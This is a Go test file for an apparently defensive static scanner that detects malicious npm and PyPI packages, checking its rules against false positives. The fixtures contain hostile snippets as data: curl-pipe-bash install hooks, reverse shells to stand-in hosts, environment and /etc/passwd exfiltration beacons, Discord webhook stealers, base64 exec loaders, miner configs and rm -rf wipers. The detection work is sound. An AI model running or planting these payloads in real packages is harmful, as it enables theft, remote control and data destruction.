package static

import (
	"encoding/base64"
	"strings"
	"testing"

	"github.com/joncooper/detonator/internal/artifact"
	"github.com/joncooper/detonator/internal/verdict"
)

func unpacked(files map[string]string) *artifact.Unpacked {
	u := &artifact.Unpacked{}
	for p, c := range files {
		u.Files = append(u.Files, artifact.File{Path: p, Content: []byte(c), Size: int64(len(c))})
	}
	return u
}

func hasRule(sigs []verdict.Signal, rule string) *verdict.Signal {
	for i := range sigs {
		if sigs[i].Rule == rule {
			return &sigs[i]
		}
	}
	return nil
}

func TestNPMMaliciousPostinstall(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "evil", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"evil","scripts":{"postinstall":"curl http://1.2.3.4/x | bash"}}`,
	})
	sigs := Analyze(art, u)
	s := hasRule(sigs, "npm-install-hook-danger")
	if s == nil || s.Severity != verdict.SevCritical {
		t.Fatalf("want critical npm-install-hook-danger, got %+v", sigs)
	}
}

func TestNPMBenignInstallHookIsLow(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "native", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"native","scripts":{"install":"node-gyp rebuild"}}`,
	})
	sigs := Analyze(art, u)
	s := hasRule(sigs, "npm-install-hook")
	if s == nil || s.Severity != verdict.SevLow {
		t.Fatalf("want low npm-install-hook, got %+v", sigs)
	}
}

func TestNPMNoScriptsNoSignal(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "clean", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"clean","version":"1.0.0"}`,
		"index.js":     `module.exports = 42;`,
	})
	if sigs := Analyze(art, u); len(sigs) != 0 {
		t.Fatalf("clean package produced signals: %+v", sigs)
	}
}

func TestPySetupExecutionWithNetworkIsCritical(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "evil", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"setup.py": "import subprocess\nsubprocess.run(['curl','http://1.2.3.4'])\nfrom setuptools import setup\nsetup(name='evil')",
	})
	sigs := Analyze(art, u)
	s := hasRule(sigs, "py-setup-execution")
	if s == nil || s.Severity != verdict.SevCritical {
		t.Fatalf("want critical py-setup-execution, got %+v", sigs)
	}
}

func TestDynamicExecOfDecodedPayload(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "evil", Version: "1.0.0"}
	// The telnyx-style payload: exec of base64-decoded content, plus a base64
	// literal that decodes to a hidden C2 URL.
	c2b64 := "aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg==" // http://83.142.209.203:8080/hangup.wav
	u := unpacked(map[string]string{
		"pkg/client.py": "import base64\nx = base64.b64decode('" + c2b64 + "')\nexec(base64.b64decode(payload))\n",
	})
	got := hasRuleSet(Analyze(art, u))
	if got["dynamic-exec-decoded"] != verdict.SevCritical {
		t.Fatalf("want critical dynamic-exec-decoded, got %+v", got)
	}
	if got["encoded-network-indicator"] != verdict.SevHigh {
		t.Fatalf("want high encoded-network-indicator, got %+v", got)
	}
}

func TestBenignBase64NotFlaggedAsC2(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "ok", Version: "1.0.0"}
	// A base64 blob that decodes to binary (not a URL) must not trip the C2 rule.
	u := unpacked(map[string]string{
		"package.json": `{"name":"ok"}`,
		"data.js":      "const img = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAgAAAA';\n",
	})
	if hasRule(Analyze(art, u), "encoded-network-indicator") != nil {
		t.Fatal("benign base64 wrongly flagged as encoded C2")
	}
}

func TestHardcodedPublicIPEndpoint(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "evil", Version: "1.0.0"}
	// Public IP + network primitive -> flagged (strapi shape).
	bad := unpacked(map[string]string{
		"postinstall.js": "const http=require('http');http.request({hostname:'144.31.107.231',port:9999});",
	})
	if hasRuleSet(Analyze(art, bad))["hardcoded-ip-endpoint"] != verdict.SevHigh {
		t.Fatal("public-IP endpoint not flagged")
	}
	// Private/loopback/DNS IPs must NOT trip it.
	ok := unpacked(map[string]string{
		"index.js": "connect('127.0.0.1');connect('10.0.0.5');dns('8.8.8.8');listen('0.0.0.0');",
	})
	if hasRule(Analyze(art, ok), "hardcoded-ip-endpoint") != nil {
		t.Fatal("private/loopback/DNS IP wrongly flagged")
	}
	// A public IP with no network primitive nearby must not trip it.
	noNet := unpacked(map[string]string{"data.js": "const version='144.31.107.231';"})
	if hasRule(Analyze(art, noNet), "hardcoded-ip-endpoint") != nil {
		t.Fatal("public IP without a network primitive wrongly flagged")
	}
}

func TestSBOMProvenanceNotFlaggedAsC2(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "pillow", Version: "1.0.0"}
	// A CycloneDX SBOM embeds a base64-encoded git commit log (pedigree/diff
	// text) that decodes to prose containing a URL. This is inert provenance
	// metadata, not a payload, and must not trip encoded-network-indicator.
	// (Reproduces the pillow-12.3.0 false positive.)
	gitlog := base64.StdEncoding.EncodeToString([]byte(
		"commit 782a11d6b5b61c6dc21e714950a4af5bf89f023c\nAuthor: dev\nSee http://example.com/patch for details\n"))
	sbom := `{"components":[{"pedigree":{"commits":[{"diff":{"text":{"content":"` + gitlog + `"}}}]}}]}`
	u := unpacked(map[string]string{
		"pillow-1.0.0.dist-info/sboms/pillow-1.0.0.cdx.json": sbom,
	})
	if hasRule(Analyze(art, u), "encoded-network-indicator") != nil {
		t.Fatal("SBOM provenance base64 wrongly flagged as encoded C2")
	}
	// Precision guard: the SAME base64 blob in ordinary source still fires, so
	// the fix only exempts SBOM manifests, not the rule itself.
	src := unpacked(map[string]string{"pkg/client.py": "U = '" + gitlog + "'\n"})
	if hasRule(Analyze(art, src), "encoded-network-indicator") == nil {
		t.Fatal("encoded C2 in source no longer detected (over-broad exemption)")
	}
}

func TestEnvExfilRequiresSendAdjacency(t *testing.T) {
	npm := verdict.Artifact{Ecosystem: verdict.NPM}
	pypi := verdict.Artifact{Ecosystem: verdict.PyPI}
	// Malicious: the whole env is serialized INTO a network send body -> flagged.
	bad := unpacked(map[string]string{"c.js": "require('https').request(u,{method:'POST'}).end(JSON.stringify(process.env));"})
	if hasRule(Analyze(npm, bad), "install-env-exfil") == nil {
		t.Fatal("env serialized into a POST body not flagged")
	}
	// Benign (esbuild shape): env spread into a subprocess options object, with an
	// unrelated network call elsewhere -> must NOT flag.
	ok1 := unpacked(map[string]string{"install.js": "const cp=require('child_process');cp.spawn(bin,args,{env:{...process.env,X:'1'}});require('https').get(url);"})
	if hasRule(Analyze(npm, ok1), "install-env-exfil") != nil {
		t.Fatal("env spread into a subprocess wrongly flagged (esbuild-class FP)")
	}
	// Benign (click shape): reading dict(os.environ) locally, unrelated network call.
	ok2 := unpacked(map[string]string{"t.py": "e = dict(os.environ)\nrequests.get('http://api.example')\n"})
	if hasRule(Analyze(pypi, ok2), "install-env-exfil") != nil {
		t.Fatal("local dict(os.environ) read wrongly flagged (click-class FP)")
	}
}

func TestReverseShellSource(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
	// Tier A: literal /dev/tcp idiom in source.
	a := unpacked(map[string]string{"lib/x.sh": "bash -i >& /dev/tcp/evil.example/4444 0>&1\n"})
	if hasRuleSet(Analyze(art, a))["reverse-shell-source"] != verdict.SevCritical {
		t.Fatal("Tier A /dev/tcp idiom not flagged critical")
	}
	// Tier B: node socket bound to a shell's stdio.
	b := unpacked(map[string]string{"lib/conn.js": "const s=require('net').connect(4444,'c2.example');require('child_process').spawn('/bin/sh',[],{stdio:[s,s,s]});"})
	if hasRuleSet(Analyze(art, b))["reverse-shell-source"] != verdict.SevCritical {
		t.Fatal("Tier B node socket->shell not flagged critical")
	}
	// Tier B: python dup2(socket.fileno) + /bin/sh.
	p := unpacked(map[string]string{"x/net.py": "import os,socket,subprocess\ns=socket.socket();s.connect(('c2.example',4444))\nos.dup2(s.fileno(),0)\nsubprocess.call(['/bin/sh','-i'])\n"})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, p))["reverse-shell-source"] != verdict.SevCritical {
		t.Fatal("Tier B python dup2->shell not flagged critical")
	}
	// Precision: a benign net client that opens a socket and spawns a helper but
	// does NOT bind the socket to a shell must not fire.
	ok := unpacked(map[string]string{"index.js": "const s=require('net').connect(80,'api.example');require('child_process').spawn('node',['worker.js']);"})
	if hasRule(Analyze(art, ok), "reverse-shell-source") != nil {
		t.Fatal("benign socket + non-shell spawn wrongly flagged")
	}
}

func TestCryptominerArtifact(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
	// Stratum scheme alone is sufficient.
	s := unpacked(map[string]string{"x/config.json": `{"url":"stratum+tcp://pool.example:3333"}`})
	if hasRuleSet(Analyze(art, s))["cryptominer-artifact"] != verdict.SevHigh {
		t.Fatal("stratum scheme not flagged")
	}
	// Miner binary + config token.
	m := unpacked(map[string]string{"run.js": "spawn('xmrig',['--donate-level','1','--coin','monero']);"})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, m))["cryptominer-artifact"] != verdict.SevHigh {
		t.Fatal("miner binary + config not flagged")
	}
	// Precision: a bare mention of a miner name with no config token must not fire.
	ok := unpacked(map[string]string{"index.js": "// benchmarks vs ethminer performance\nmodule.exports=1;"})
	if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, ok), "cryptominer-artifact") != nil {
		t.Fatal("incidental miner-name mention wrongly flagged")
	}
}

func TestDestructivePayload(t *testing.T) {
	// Install hook wiper -> critical.
	hook := unpacked(map[string]string{"package.json": `{"name":"x","scripts":{"postinstall":"rm -rf --no-preserve-root / #wipe"}}`})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, hook))["destructive-payload"] != verdict.SevCritical {
		t.Fatal("install-hook wiper not critical")
	}
	// setup.py rmtree(home) -> critical.
	setup := unpacked(map[string]string{"setup.py": "import shutil,os\nshutil.rmtree(os.path.expanduser('~'))\nfrom setuptools import setup\nsetup(name='x')"})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, setup))["destructive-payload"] != verdict.SevCritical {
		t.Fatal("setup.py rmtree(home) not critical")
	}
	// Conditional in-place source wipe -> high.
	src := unpacked(map[string]string{"index.js": "if (Date.now() > 9e12) require('fs').rmSync(require('os').homedir(), { recursive: true });"})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, src))["destructive-payload"] != verdict.SevHigh {
		t.Fatal("source home-wipe not high")
	}
	// Precision: benign build cleanups must NOT fire.
	for _, benign := range []string{
		`{"name":"x","scripts":{"postinstall":"rm -rf dist build node_modules .cache"}}`,
	} {
		u := unpacked(map[string]string{"package.json": benign})
		if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, u), "destructive-payload") != nil {
			t.Fatalf("benign cleanup wrongly flagged: %s", benign)
		}
	}
	clean := unpacked(map[string]string{"build.js": "require('fs').rmSync('build',{recursive:true}); require('fs').rmSync('./tmp/out');"})
	if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, clean), "destructive-payload") != nil {
		t.Fatal("benign fs.rmSync of build dir wrongly flagged")
	}
}

func TestInstallEnvExfil(t *testing.T) {
	// Install-hook target that harvests the whole env to a network sink -> critical.
	npm := unpacked(map[string]string{
		"package.json": `{"name":"x","scripts":{"postinstall":"node collect.js"}}`,
		"collect.js":   "require('https').request('https://c2.example/i',{method:'POST'}).end(JSON.stringify(process.env));",
	})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, npm))["install-env-exfil"] != verdict.SevCritical {
		t.Fatal("install-hook env stealer not critical")
	}
	// Same harvest in a runtime module (not install-time) -> high.
	mod := unpacked(map[string]string{"x/telemetry.py": "import os,urllib.request\nurllib.request.urlopen('http://c2.example', data=str(dict(os.environ)).encode())\n"})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, mod))["install-env-exfil"] != verdict.SevHigh {
		t.Fatal("runtime env harvest not high")
	}
	// Precision: reading a SINGLE named var next to a fetch must NOT fire.
	ok := unpacked(map[string]string{"index.js": "const mode=process.env.NODE_ENV; fetch('https://api.example/'+mode);"})
	if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, ok), "install-env-exfil") != nil {
		t.Fatal("single named-var read wrongly flagged as env exfil")
	}
	// Precision: whole-env serialize with NO network sink must NOT fire.
	noNet := unpacked(map[string]string{"log.js": "console.log(JSON.stringify(process.env));"})
	if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, noNet), "install-env-exfil") != nil {
		t.Fatal("env serialize without egress wrongly flagged")
	}
}

func hasRuleSet(sigs []verdict.Signal) map[string]verdict.Severity {
	m := map[string]verdict.Severity{}
	for _, s := range sigs {
		m[s.Rule] = s.Severity
	}
	return m
}

func TestObfuscatorFingerprint(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
	// javascript-obfuscator output: several distinct _0x-hex names, each reused —
	// the lodash-twist shape.
	obf := "var _0x1a2b=['aGVsbG8=','d29ybGQ='];function _0x3c4d(_0x5e6f){return _0x1a2b[_0x5e6f];}" +
		"var _0x7a8b=_0x3c4d(0x0);var _0x9c0d=_0x3c4d(0x1);console['log'](_0x7a8b,_0x9c0d,_0x1a2b,_0x3c4d,_0x5e6f);"
	u := unpacked(map[string]string{"package.json": `{"name":"x","main":"index.js"}`, "index.js": obf})
	if hasRuleSet(Analyze(art, u))["obfuscated-code"] != verdict.SevHigh {
		t.Fatalf("obfuscator _0x fingerprint not flagged high: %+v", Analyze(art, u))
	}
	// Precision: a single stray _0x token (a hash, an address) must NOT fire.
	stray := unpacked(map[string]string{"c.js": "const addr='_0xDEADBEEF';module.exports=addr;"})
	if hasRule(Analyze(art, stray), "obfuscated-code") != nil {
		t.Fatal("single _0x token wrongly flagged as obfuscated-code")
	}
	// Precision: terser-style minification (short alphanumeric names) is NOT the
	// _0x fingerprint, so it must not fire obfuscated-code.
	minified := unpacked(map[string]string{"dist/bundle.js": "!function(e,t){for(var n=0,r=e.length;n<r;n++)t(e[n],n)}([1,2,3],function(a,i){return a*i})"})
	if hasRule(Analyze(art, minified), "obfuscated-code") != nil {
		t.Fatal("terser-minified bundle wrongly flagged as obfuscated-code")
	}
	// Precision: hex-offset FIELD names (offset_0x8000) are not obfuscator identifiers —
	// the _0x is embedded in a longer name, not standalone (magika ships 8 of these).
	offsets := unpacked(map[string]string{"magika.py": "cfg=dict(offset_0x8000=[],offset_0x8007=[],offset_0x8800=[],offset_0x8807=[],offset_0x9000=[],offset_0x9007=[],offset_0x9800=[],offset_0x9807=[])"})
	if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, offsets), "obfuscated-code") != nil {
		t.Fatal("hex-offset field names (offset_0x8000) wrongly flagged as obfuscated-code")
	}
	// Precision: re.compile over magic-byte signatures is not eval/exec obfuscation.
	recompile := unpacked(map[string]string{"sig.py": `import re` + "\n" + `PNG=re.compile("\x89\x50\x4e\x47\x0d\x0a\x1a\x0a")` + "\n" + `JPG=re.compile("\xff\xd8\xff")`})
	if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, recompile), "obfuscated-code") != nil {
		t.Fatal("re.compile over byte signatures wrongly flagged as obfuscated-code")
	}
}

func TestHostReconExfil(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
	// Reads hostname + username and POSTs it at install time (login-paypal shape) -> High.
	u := unpacked(map[string]string{
		"package.json": `{"name":"x","scripts":{"postinstall":"node index.js"}}`,
		"index.js":     "const os=require('os');const d=os.hostname()+process.env.USER;require('https').request('https://c2.example',{method:'POST'}).end(d);",
	})
	if hasRuleSet(Analyze(art, u))["host-recon-exfil"] != verdict.SevHigh {
		t.Fatalf("install-time host-recon-exfil not high: %+v", Analyze(art, u))
	}
	// Same shape in a RUNTIME module (not a hook target) must NOT fire: reading host
	// identity + connecting is the normal job of DB drivers and browser automation
	// (asyncpg, playwright false-positived here). Recon only counts at install time.
	mod := unpacked(map[string]string{
		"lib/report.js": "const os=require('os');fetch('https://t.example',{method:'POST',body:os.hostname()+os.userInfo().username});",
	})
	if hasRule(Analyze(art, mod), "host-recon-exfil") != nil {
		t.Fatal("runtime host-recon-exfil wrongly flagged (should be install-context only)")
	}
	// Precision: a lone hostname read next to a fetch (one primitive) must NOT fire.
	ok := unpacked(map[string]string{"index.js": "const h=require('os').hostname();fetch('https://api.example/'+h);"})
	if hasRule(Analyze(art, ok), "host-recon-exfil") != nil {
		t.Fatal("single hostname read wrongly flagged as recon exfil")
	}
	// Precision: reading identity with NO network sink must NOT fire.
	noNet := unpacked(map[string]string{"i.js": "const os=require('os');console.log(os.hostname(),os.userInfo());"})
	if hasRule(Analyze(art, noNet), "host-recon-exfil") != nil {
		t.Fatal("identity read without egress wrongly flagged")
	}
}

func TestPythonEscapeObfuscation(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
	// BlankOBF shape: eval() applied directly to an octal/hex escape-encoded string.
	// The whole Python stealer family (keyauthkey, axelo, robloxlogger) is this.
	blank := "# Obfuscated with BlankOBF\n_____=eval(\"\\145\\166\\x61\\x6c\");_______=_____(\"\\143\\x6f\\155\\160\\x69\\154\\x65\")"
	u := unpacked(map[string]string{"pkg/__init__.py": blank})
	if hasRuleSet(Analyze(art, u))["obfuscated-code"] != verdict.SevHigh {
		t.Fatalf("BlankOBF eval-escape not flagged high: %+v", Analyze(art, u))
	}
	// Precision: a benign byte-string constant (a few \x escapes, no eval-of-it) must
	// NOT fire — packages embed small binary blobs and magic numbers routinely.
	bytesConst := unpacked(map[string]string{"c.py": "MAGIC=b'\\x89\\x50\\x4e\\x47\\x0d\\x0a'\ndef read():\n    return MAGIC"})
	if hasRule(Analyze(art, bytesConst), "obfuscated-code") != nil {
		t.Fatal("benign \\x byte-constant wrongly flagged as obfuscated-code")
	}
}

func TestShellReconExfilInHook(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
	// postinstall→exec(curl … $(whoami)/$(hostname) … /etc/passwd … | base64) beacon
	// (angular-trackjs / oast.fun family). Recon is shell inside the command string,
	// which the JS-primitive hostReconExfil misses; shellReconExfil recovers it.
	beacon := "const {exec}=require('child_process');\n" +
		"const c=`curl -X POST \"https://x.oast.fun/$(whoami)/$(hostname)/\" -A \"$( (cat /etc/passwd && id && uname -a) | base64 -w0 )\"`;\n" +
		"exec(c,()=>{});"
	u := unpacked(map[string]string{
		"package.json": `{"name":"x","scripts":{"postinstall":"node postinstall.js"}}`,
		"postinstall.js": beacon,
	})
	if hasRuleSet(Analyze(art, u))["host-recon-exfil"] != verdict.SevHigh {
		t.Fatalf("shell recon+exfil beacon not flagged high: %+v", Analyze(art, u))
	}
	// Precision: a benign postinstall that curls a plain analytics URL (no recon)
	// must NOT fire — network alone is not recon.
	benign := unpacked(map[string]string{
		"package.json":   `{"name":"x","scripts":{"postinstall":"node postinstall.js"}}`,
		"postinstall.js": "const {exec}=require('child_process');exec('curl -s https://analytics.example/ping',()=>{});",
	})
	if hasRule(Analyze(art, benign), "host-recon-exfil") != nil {
		t.Fatal("benign analytics curl (no recon) wrongly flagged as recon exfil")
	}
}

func TestHardcodedWebhookExfil(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
	// Discord token/cookie stealer: a hardcoded webhook with a real id+token, run at
	// import time (xoloctwuaywkna shape). Malicious regardless of install context.
	steal := "import requests\nW='https://discord.com/api/webhooks/1038207777992101990/knXy-k-UaW_h8DWIZdzVAkBYEJh7j66GijIlm6fbg8'\nrequests.post(W,json={'d':open('cookies').read()})"
	u := unpacked(map[string]string{"pkg/__init__.py": steal})
	if hasRuleSet(Analyze(art, u))["hardcoded-webhook-exfil"] != verdict.SevHigh {
		t.Fatalf("hardcoded discord webhook not flagged high: %+v", Analyze(art, u))
	}
	// Telegram bot exfil variant.
	tg := unpacked(map[string]string{"s.py": "u='https://api.telegram.org/bot123456789:AAHqwertyuiopasdfghjklzxcvbnm123456/sendDocument'"})
	if hasRuleSet(Analyze(art, tg))["hardcoded-webhook-exfil"] != verdict.SevHigh {
		t.Fatalf("hardcoded telegram bot endpoint not flagged high: %+v", Analyze(art, tg))
	}
	// Precision: a discord.py client library that references the API host WITHOUT a
	// concrete id+token must NOT fire (it's the endpoint pattern, not a credential).
	lib := unpacked(map[string]string{"client.py": "BASE='https://discord.com/api/v10'\ndef webhook(id,token):\n    return f'{BASE}/webhooks/{id}/{token}'"})
	if hasRule(Analyze(art, lib), "hardcoded-webhook-exfil") != nil {
		t.Fatal("discord API base without concrete id+token wrongly flagged")
	}
}

func TestPrecisionAtScaleV2FPs(t *testing.T) {
	npm := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
	pypi := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
	// Repeated-octet placeholder IP (validators ships 12.12.12.12 in an example).
	ip := unpacked(map[string]string{"validators/hostname.py": "EXAMPLE_HOST = '12.12.12.12'  # not a real host"})
	if hasRule(Analyze(pypi, ip), "hardcoded-ip-endpoint") != nil {
		t.Fatal("repeated-octet placeholder 12.12.12.12 wrongly flagged as C2")
	}
	// reverse-shell / wiper tokens inside a minified bundle are substring
	// coincidences, not payloads (streamlit, google-adk block on exactly this).
	minified := unpacked(map[string]string{
		"static/js/main.A1b2C3d4.js": "var x=" + strings.Repeat("a", 2500) + ";function mkfifo(){}var q='sh -i';var z='mkfs';" + strings.Repeat("b", 2500),
	})
	if hasRule(Analyze(npm, minified), "reverse-shell-source") != nil {
		t.Fatal("minified bundle wrongly flagged as reverse-shell")
	}
	// A recon token in a description docstring (passlib: "a hash found in /etc/shadow")
	// with a homepage URL elsewhere must NOT read as a shell recon beacon.
	doc := unpacked(map[string]string{
		"package.json": `{"name":"x","scripts":{"postinstall":"node p.js"}}`,
		"p.js":         "// verifying a hash found in /etc/shadow, see docs\nconst u='https://example.com/home';\nmodule.exports=u;",
	})
	if hasRule(Analyze(npm, doc), "host-recon-exfil") != nil {
		t.Fatal("/etc/shadow in prose + unrelated URL wrongly flagged as recon exfil")
	}
	// But a real beacon — recon INSIDE the fetch command — still fires.
	beacon := unpacked(map[string]string{
		"package.json":   `{"name":"x","scripts":{"postinstall":"node p.js"}}`,
		"p.js":           "require('child_process').exec('curl https://c2.example/$(whoami) -d \"$(cat /etc/passwd|base64)\"');",
	})
	if hasRuleSet(Analyze(npm, beacon))["host-recon-exfil"] != verdict.SevHigh {
		t.Fatal("real curl-recon beacon no longer caught after proximity tightening")
	}
}

func TestPySetupExecutionPrecision(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI}
	// Benign setup.py: build subprocess, exec of a version file, a homepage url=
	// in metadata — legitimate, must NOT fire (numpy/setuptools/boto3 class).
	benign := unpacked(map[string]string{
		"setup.py": "import os, subprocess\nexec(open('pkg/_version.py').read())\nsubprocess.run(['make'])\nfrom setuptools import setup\nsetup(name='x', url='https://github.com/me/x')",
	})
	if hasRule(Analyze(art, benign), "py-setup-execution") != nil {
		t.Fatal("benign build setup.py wrongly flagged as py-setup-execution")
	}
	// Malicious: a network CALL at install time (download/exfil) -> critical.
	mal := unpacked(map[string]string{
		"setup.py": "import urllib.request\nurllib.request.urlopen('http://c2.example', data=open('/etc/passwd','rb').read())\nfrom setuptools import setup\nsetup(name='x')",
	})
	if hasRuleSet(Analyze(art, mal))["py-setup-execution"] != verdict.SevCritical {
		t.Fatal("setup.py network exfil not critical")
	}
}

func TestHardcodedIPPrecision(t *testing.T) {
	// Dotted-quads that parse as public IPs but are NOT endpoints: a version
	// string, an OID, a test-message placeholder. None may fire.
	for _, s := range []string{
		"__version__ = '3.5.0.1'\nimport ssl\nssl.create_default_context()",
		"x = ObjectIdentifier('1.2.3.4')\nimport socket\ns=socket.socket()",
		"assert \"hostname '1.1.1.2' doesn't match cert\"\n",
	} {
		u := unpacked(map[string]string{"m.py": s})
		if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, u), "hardcoded-ip-endpoint") != nil {
			t.Fatalf("non-endpoint dotted-quad wrongly flagged: %q", s)
		}
	}
	// A real endpoint in a host role still fires.
	c2 := unpacked(map[string]string{"c.js": "require('net').connect({host:'144.31.107.231',port:9999});"})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, c2))["hardcoded-ip-endpoint"] != verdict.SevHigh {
		t.Fatal("real host:'IP' endpoint no longer flagged")
	}
}

func TestBuildToolingDestructiveNotFlagged(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI}
	// Shipped CI/build/vendored tooling doing legit cleanups must NOT read as a
	// payload (numpy ships .github workflows + vendored-meson packaging scripts).
	for _, path := range []string{".github/workflows/ci.yml", "tools/ci/release.py", "vendored-meson/meson/packaging/createmsi.py"} {
		u := unpacked(map[string]string{path: "run(['rm','-rf','/usr/local/x']); shutil.rmtree(os.path.expanduser('~/.cache'))"})
		if hasRule(Analyze(art, u), "destructive-payload") != nil {
			t.Fatalf("build tooling %q wrongly flagged destructive", path)
		}
	}
	// Dockerfiles (any suffix/prefix) and container-build dirs do layer cleanups
	// (rm -rf /var, rm -rf ~/) that run at image build, not the host — opencv-python
	// (Dockerfile_i686, actions-runner.Dockerfile), swebench (harness/dockerfiles/).
	for _, path := range []string{"docker/manylinux1/Dockerfile_i686", "3rdparty/zlib/actions-runner.Dockerfile", "swebench/harness/dockerfiles/c.py"} {
		u := unpacked(map[string]string{path: "content = 'RUN rm -rf /var && rm -rf /root'"})
		if hasRule(Analyze(art, u), "destructive-payload") != nil {
			t.Fatalf("dockerfile build tooling %q wrongly flagged destructive", path)
		}
	}
	// A real install-time wiper still fires.
	hook := unpacked(map[string]string{"package.json": `{"name":"x","scripts":{"postinstall":"rm -rf --no-preserve-root /"}}`})
	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, hook))["destructive-payload"] != verdict.SevCritical {
		t.Fatal("real install-hook wiper no longer flagged")
	}
}

func TestDocPlaceholderKeyNotFlagged(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI}
	// AWS's own documentation placeholder in a .rst must NOT read as a leaked key.
	u := unpacked(map[string]string{"pkg/examples/s3.rst": "Use key AKIAIOSFODNN7EXAMPLE in the example."})
	if hasRule(Analyze(art, u), "embedded-aws-key") != nil {
		t.Fatal("AWS doc placeholder key wrongly flagged")
	}
	// A real AKIA key in real source still fires.
	src := unpacked(map[string]string{"pkg/client.py": "AWS_KEY='AKIA1234567890ABCDEF'"})
	if hasRule(Analyze(art, src), "embedded-aws-key") == nil {
		t.Fatal("real embedded AWS key no longer detected")
	}
}

func TestPrecisionAtScaleFPs(t *testing.T) {
	npm := verdict.Artifact{Ecosystem: verdict.NPM}
	pypi := verdict.Artifact{Ecosystem: verdict.PyPI}
	// Each of these false-positived on a top-downloaded package; none may flag.
	benign := []struct {
		art  verdict.Artifact
		path string
		body string
		note string
	}{
		{pypi, "scipy/sparse/linalg/_eigen/arpack/arnaud/Makefile", "clean:\n\trm -rf /usr/local/tmp\n", "Makefile is build tooling (scipy)"},
		{pypi, "depends/install_imagequant.sh", "rm -rf ~/build-cache\n", "depends/ build script (pillow)"},
		{pypi, "litellm/proxy/guardrails/categories/prompt_injection.yaml", "patterns:\n  - eval(atob(x))\n  - nc -e /bin/sh\n  - mkfs\n", "data file listing malicious patterns (litellm)"},
		{npm, "lib/utilsBundle.js", "var x=require('net').connect(1,'h');cp.spawn('cmd.exe');dup2(x)", "vendored bundle (playwright)"},
		{npm, "proxy/_next/static/chunks/0abc.js", "['mkfifo','mkfs','mknod'].join('|')", "Next.js build chunk (litellm ui)"},
		{pypi, "asyncpg/connect_utils.py", "import os,socket\nh=os.hostname();u=os.userInfo()\nsocket.socket().connect((h,5432))", "runtime DB driver recon (asyncpg)"},
		{pypi, "googleapiclient/discovery_cache/documents/appengine.v1.json", "{\"key\":\"-----BEGIN PRIVATE KEY-----\\nabc\\n-----END PRIVATE KEY-----\"}", "key in a data/cache json (google)"},
	}
	for _, c := range benign {
		u := unpacked(map[string]string{c.path: c.body})
		if sigs := Analyze(c.art, u); len(sigs) != 0 {
			for _, s := range sigs {
				if s.Severity == verdict.SevHigh || s.Severity == verdict.SevCritical || s.Severity == verdict.SevMedium {
					t.Errorf("FP: %s wrongly flagged %s (%s)", c.note, s.Rule, c.path)
				}
			}
		}
	}
	// setup.py with a README inlined into long_description whose examples call
	// requests.get(...) must NOT read as an install-time network call (backoff).
	readme := "This module wraps requests. Example:\n\n    @backoff.on_exception(backoff.expo)\n    def get_url(url):\n        return requests.get(url)\n\n" + strings.Repeat("More docs. ", 40)
	bo := unpacked(map[string]string{"setup.py": "from setuptools import setup\nsetup(name='backoff', long_description='" + readme + "')"})
	if hasRule(Analyze(pypi, bo), "py-setup-execution") != nil {
		t.Error("FP: requests.get in a setup.py long_description (docs) wrongly flagged py-setup-execution")
	}

	// Precision guard must not blind the real thing: the malicious counterparts still fire.
	realWiper := unpacked(map[string]string{"index.js": "require('fs').rmSync('/',{recursive:true,force:true});"})
	if hasRule(Analyze(npm, realWiper), "destructive-payload") == nil {
		t.Error("real source wiper no longer detected")
	}
